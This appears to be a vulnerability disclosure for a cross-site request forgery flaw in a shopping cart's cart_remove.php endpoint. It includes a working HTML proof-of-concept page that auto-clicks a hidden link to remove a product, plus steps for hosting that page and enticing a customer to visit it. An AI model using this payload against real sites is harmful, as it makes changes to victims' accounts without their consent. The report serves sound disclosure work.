| Author KhanhCM ([@khanhchauminh](https://github.com/khanhchauminh)) Version: 1.0Details The GET request for removing a product with `id=1` looks like this:  ``` http://127.0.0.1:8888/cart_remove.php?id=1  ```  Changing the value of the `id` parameter in the customer session will remove the product with that ID. A remote attacker can embed the request into an innocent-looking hyperlink:  ``` <a href="http://127.0.0.1:8888/cart_remove.php?id=1">View</a>  ``` Step to reproduce  1. First, create a malicious HTML page then host a website containing that page.  PoC: ``` <html> <head>   <title>CSRF PoC</title> </head> <body>   <p>CSRF PoC</p>   <a id='link' href="http://127.0.0.1:8888/cart_remove.php?id=1">View</a>   <script>     document.getElementById('link').click();   </script> </body> </html>  ```  2. Entice the customer to click on the link to the malicious site. When the customer browses to that site, the link would be automatically clicked via JavaScript and the product will be removed.
